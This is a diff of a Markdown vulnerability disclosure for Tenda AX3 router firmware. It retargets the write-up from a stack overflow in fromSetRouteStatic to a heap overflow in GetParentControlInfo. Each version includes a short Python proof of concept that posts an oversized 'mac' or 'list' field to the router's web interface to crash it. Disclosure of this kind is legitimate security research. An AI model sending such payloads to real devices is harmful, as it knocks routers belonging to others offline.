@@ -16,15 +16,15 @@ Information
 Overview
 ===========
 
-**Tenda AX3 V16.03.12.11** has a **stack buffer overflow** vulnerability detected at function **fromSetRouteStatic**. This vulnerability allows attackers to cause a Denial of Service (DoS) via the **list** parameter . <br>
+**Tenda AX3 V16.03.12.11** has a **heap buffer overflow** vulnerability detected at function **GetParentControlInfo**. This vulnerability allows attackers to cause a Denial of Service (DoS) via the **mac** parameter paramter. <br>
 
 Vulnerability details
 =====================
 The vulnerability is detected at **/bin/httpd** <br>
 
-In the function **fromSetRouteStatic**, the content obtained by program through parameter **list** given by http is passed to variable **v4**. Variable **v4** enters the function **save_staticroute_data** as a parameter, and a stack overflow vulnerability exists within **save_staticroute_data** <br>
-![](https://github.com/Korey0sh1/IoT_vuln/blob/main/Tenda/AX3/img/13.png) <br>
-![](https://github.com/Korey0sh1/IoT_vuln/blob/main/Tenda/AX3/img/14.png) <br>
+In the function **GetParentControlInfo**, the content obtained by program through parameter **mac** given by http is passed to variable **src**. However ,they will be copyed to the **v5** which is a heap ptr without any length check. <br>
+![](https://github.com/Korey0sh1/IoT_vuln/blob/main/Tenda/AX3/img/18.png) <br>
+
 <br>
 
 Proof of Code
@@ -33,11 +33,11 @@ Proof of Code
 from pwn import *
 import requests
 
-url = "http://192.168.0.1/goform/SetStaticRouteCfg"
+url = "http://192.168.0.1/goform/GetParentControlInfo"
 
 payload = "a"*0x1000
 data = {
-    "list": payload,
+    "mac": payload,
 }
 res = requests.post(url=url,data=data)
 print(res.text)
@@ -45,6 +45,6 @@ print(res.text)
 
 Attack Demo
 ========
-![](https://github.com/Korey0sh1/IoT_vuln/blob/main/Tenda/AX3/img/15.png)
-![](https://github.com/Korey0sh1/IoT_vuln/blob/main/Tenda/AX3/img/16.png)
-![](https://github.com/Korey0sh1/IoT_vuln/blob/main/Tenda/AX3/img/17.png)
+![](https://github.com/Korey0sh1/IoT_vuln/blob/main/Tenda/AX3/img/19.png)
+![](https://github.com/Korey0sh1/IoT_vuln/blob/main/Tenda/AX3/img/20.png)
+![](https://github.com/Korey0sh1/IoT_vuln/blob/main/Tenda/AX3/img/21.png)
